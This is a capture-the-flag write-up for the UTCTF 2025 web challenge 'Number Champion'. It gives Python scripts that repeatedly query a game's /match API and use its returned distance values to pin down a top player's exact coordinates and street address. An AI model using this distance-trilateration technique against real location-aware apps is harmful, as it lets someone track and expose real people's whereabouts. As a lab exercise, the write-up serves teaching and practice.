@@ -1,0 +1,356 @@
+import { Steps } from "nextra/components";
+
+# Number Champion
+
+## Overview
+
+---
+
+| Description    | Details                                     |
+| :------------- | :------------------------------------------ |
+| Event name     | [UTCTF 2025](https://utctf.live/challenges) |
+| Challenge name | Number Champion                             |
+| Category       | Web                                         |
+| Points         | 711                                         |
+| Date           | 14-03-2025                                  |
+
+### Challenge Information
+
+> The number 1 player in this game, geopy hit 3000 elo last week. I want to figure out where they train to be the best.
+> Flag is the address of this player (according to google maps), in the following format all lowercase:
+> `utflag{<street-address>-<city>-<zip-code>}`
+> For example, if the address is 110 Inner Campus Drive, Austin, TX 78705, the flag would be `utflag{110-inner-campus-drive-austin-78705}`
+> By Samintell (@Samintell on discord)
+> https://numberchamp-challenge.utctf.live/
+
+### Additional Information
+
+The website appears as follows:
+
+![number champion website](/utctf2025/number-champion.png)
+
+## Analysis
+
+---
+
+When we send GET requests to the url we will find multiple endpoint on the javascript.
+
+```
+curl --path-as-is 'https://numberchamp-challenge.utctf.live/'
+```
+
+```javascript
+let userUUID = null,
+  opponentUUID = null;
+var lat = 0,
+  lon = 0;
+async function findMatch() {
+  const e = await fetch(`/match?uuid=${userUUID}&lat=${lat}&lon=${lon}`, {
+      method: "POST",
+    }),
+    t = await e.json();
+  t.error
+    ? alert(t.error)
+    : ((opponentUUID = t.uuid),
+      (document.getElementById("match-info").innerText = `Matched with ${
+        t.user
+      } (Elo: ${t.elo}, Distance: ${Math.round(t.distance)} miles)`),
+      (document.getElementById("match-section").style.display = "none"),
+      (document.getElementById("battle-section").style.display = "block"));
+}
+async function battle() {
+  const e = document.getElementById("number-input").value;
+  if (!e) return void alert("Please enter a number.");
+  const t = await fetch(
+      `/battle?uuid=${userUUID}&opponent=${opponentUUID}&number=${e}`,
+      {
+        method: "POST",
+      }
+    ),
+    n = await t.json();
+  n.error
+    ? alert(n.error)
+    : ((document.getElementById(
+        "battle-result"
+      ).innerText = `Result: ${n.result}. Opponent's number: ${n.opponent_number}. Your new Elo: ${n.elo}`),
+      (document.getElementById(
+        "user-info"
+      ).innerText = `Your updated Elo: ${n.elo}`),
+      (document.getElementById("battle-section").style.display = "none"),
+      (document.getElementById("match-section").style.display = "block"));
+}
+window.onload = async () => {
+  if (navigator.geolocation)
+    navigator.geolocation.getCurrentPosition(async (e) => {
+      (lat = e.coords.latitude), (lon = e.coords.longitude);
+      const t = await fetch(`/register?lat=${lat}&lon=${lon}`, {
+          method: "POST",
+        }),
+        n = await t.json();
+      (userUUID = n.uuid),
+        (document.getElementById(
+          "user-info"
+        ).innerText = `Welcome, ${n.user}! Elo: ${n.elo}`);
+    });
+  else {
+    alert("Geolocation is not supported by this browser.");
+    const e = await fetch(`/register?lat=${lat}&lon=${lon}`, {
+        method: "POST",
+      }),
+      t = await e.json();
+    (userUUID = t.uuid),
+      (document.getElementById(
+        "user-info"
+      ).innerText = `Welcome, ${t.user}! Elo: ${t.elo}`);
+  }
+};
+```
+
+Then start with sending POST request to /register.
+
+```
+curl -X POST --path-as-is 'https://numberchamp-challenge.utctf.live/register'
+```
+
+```json
+{
+  "elo": 1000,
+  "user": "Cape Dog 306",
+  "uuid": "1314d302-6d98-47c0-96d9-ccd956d1e05e"
+}
+```
+
+From here we know that the data format will be as json payload. Then try POST request to /match.
+
+```
+curl -X POST --path-as-is  'https://numberchamp-challenge.utctf.live/match?uuid=1314d302-6d98-47c0-96d9-ccd956d1e05e&lat=0&lon=0'
+```
+
+```json
+{
+  "distance": 6213.990213985429,
+  "elo": 944,
+  "user": "Emerald Heron 429",
+  "uuid": "a5e1ce2e-39b1-4f07-b64f-0cc22bc64903"
+}
+
+{
+  "distance": 5580.176029243267,
+  "elo": 1063,
+  "user": "Shoal Sheep 379",
+  "uuid": "6262844a-769d-4750-acff-9a94327e03aa"
+}
+
+```
+
+After 2 tries, we will get matched by an opponent around our `elo` and information about their `distance`, now we need to find user `geopy` and his distance from us.
+
+## Solution
+
+---
+
+<Steps>
+### Initial setup
+
+We will create script to iterate match finding untuk we find user `geopy` with elo 3000 and their distance from us.
+
+```python
+import requests
+
+# Configuration
+BASE_URL = "https://numberchamp-challenge.utctf.live/match"
+INITIAL_UUID = "4d295661-2a94-4373-af21-589cabd7ea8e"
+TARGET_ELO = 3000
+MAX_ATTEMPTS = 1000  # Increased maximum attempts
+
+def find_elo_target():
+    current_uuid = INITIAL_UUID
+    lat = 0
+    lon = 0
+    attempts = 0
+    best_elo = 0
+    best_uuid = ""
+    best_user = ""
+    history = []
+
+    while attempts < MAX_ATTEMPTS:
+        attempts += 1
+
+        # Make the POST request
+        params = {"uuid": current_uuid, "lat": lat, "lon": lon}
+        try:
+            response = requests.post(BASE_URL, params=params)
+            response.raise_for_status()
+            data = response.json()
+        except Exception as e:
+            print(f"Request failed: {str(e)}")
+            break
+
+        current_elo = data["elo"]
+        new_uuid = data["uuid"]
+        new_user = data["user"]
+        history.append((current_elo, new_uuid, new_user))
+
+        # Update best found
+        if current_elo > best_elo:
+            best_elo = current_elo
+            best_uuid = new_uuid
+            best_user = new_user
+
+        # Check for target
+        if current_elo >= TARGET_ELO:
+            print(f"\n🎯 Target ELO {TARGET_ELO} found!")
+            return {
+                "found": True,
+                "final_elo": current_elo,
+                "final_uuid": new_uuid,
+                "final_user": new_user,
+                "best_elo": best_elo,
+                "best_uuid": best_uuid,
+                "best_user": best_user,
+                "attempts": attempts,
+                "history": history
+            }
+
+        current_uuid = new_uuid
+
+    print(f"\n⚠️ Target not reached after {MAX_ATTEMPTS} attempts")
+    return {
+        "found": False,
+        "best_elo": best_elo,
+        "best_user": best_user,
+        "best_uuid": best_uuid,
+        "attempts": attempts,
+        "history": history
+    }
+
+if __name__ == "__main__":
+    result = find_elo_target()
+
+    print(f"\n{'Final' if result['found'] else 'Best'} Results:")
+    print(f"ELO: {result['best_elo']}")
+    print(f"UUID: {result['best_uuid']}")
+    print(f"User: {result['best_user']}")
+```
+
+### Exploitation
+
+```
+🎯 Target ELO 3000 found!
+
+Final Results:
+ELO: 3000
+UUID: d0f627bc-ac15-4d45-8e08-73ee3b5fd06c
+User: geopy
+Distance: 5849.500680621647
+```
+
+The user `geopy` itself is a hint, where we need to use python library `geopy`.
+
+Using this script, we will find all possible coordinate from latitude 0 and longitude 0 within radius 5849.500680621647 miles.
+
+This script will iterate requests using all possible coordinate to `/match` until we find distance is 0 (with tolerance 1e-3).
+
+```python
+import requests
+from geopy.distance import distance
+import time
+
+# Initial starting point and search radius (in miles)
+current_center = (0, 0)
+search_radius = 5849.500680621647
+
+# Base URL for the POST request
+BASE_URL = "https://numberchamp-challenge.utctf.live/match?uuid=d0f627bc-ac15-4d45-8e08-73ee3b5fd06c"
+
+# Tolerance for when we consider the distance "0"
+TOLERANCE = 1e-3  # adjust if necessary
+
+# Maximum number of iterations to avoid infinite loops
+max_iterations = 100
+
+iteration = 0
+
+while search_radius > TOLERANCE and iteration < max_iterations:
+    iteration += 1
+    print(f"\nIteration {iteration}:")
+    print(f"  Current center: {current_center}")
+    print(f"  Search radius: {search_radius} miles")
+
+    best_distance = None
+    best_coordinate = None
+    best_response = None
+
+    # Check coordinates around the current center with 10° increments
+    for bearing in range(0, 361, 90):
+        # Calculate the guessed coordinate from the current center at the given search radius and bearing
+        guess_point = distance(miles=search_radius).destination(current_center, bearing)
+        lat = guess_point.latitude
+        lon = guess_point.longitude
+
+        # Construct the URL with the guess coordinate
+        url = f"{BASE_URL}&lat={lat}&lon={lon}"
+
+        try:
+            # Send POST request
+            response = requests.post(url)
+            # Parse JSON response
+            result = response.json()
+            current_guess_distance = result.get("distance", None)
+
+            print(f"  Bearing {bearing}° -> ({lat}, {lon}) | Response distance: {current_guess_distance}")
+
+            # If we get a valid distance and it is the best so far, record it.
+            if current_guess_distance is not None:
+                if best_distance is None or current_guess_distance < best_distance:
+                    best_distance = current_guess_distance
+                    best_coordinate = (lat, lon)
+                    best_response = result
+        except Exception as e:
+            print(f"  Error at bearing {bearing}°: {e}")
+
+        # Optional: small sleep to avoid overwhelming the server
+        time.sleep(0.1)
+
+    if best_distance is None:
+        print("No valid responses obtained in this iteration.")
+        break
+
+    print(f"\nBest guess in iteration {iteration}:")
+    print(f"  Coordinate: {best_coordinate}")
+    print(f"  Response: {best_response}")
+
+    # Update search radius and center for next iteration.
+    # The new search radius is the smallest 'distance' returned.
+    search_radius = best_distance
+    current_center = best_coordinate
+
+    # Check if we've reached the target (distance of 0)
+    if search_radius <= TOLERANCE:
+        print("\nTarget reached (distance is 0)!")
+        break
+
+print("\nFinal coordinate:", current_center)
+print("Final response:", best_response)
+```
+
+```
+Target reached (distance is 0)!
+
+Final coordinate: (39.940414031842494, -82.99669530908983)
+Final response: {'distance': 0.0003010347208953401, 'elo': 3000, 'user': 'geopy', 'uuid': 'd0f627bc-ac15-4d45-8e08-73ee3b5fd06c'}
+```
+
+Using coordinate `39.940414031842494, -82.99669530908983` in google maps will show the location.
+
+![Number champion location](/utctf2025/number-champion-location.png)
+
+### Flag
+
+```
+
+utflag{1059-s-high-st-columbus-43206}
+
+```
+
+</Steps>
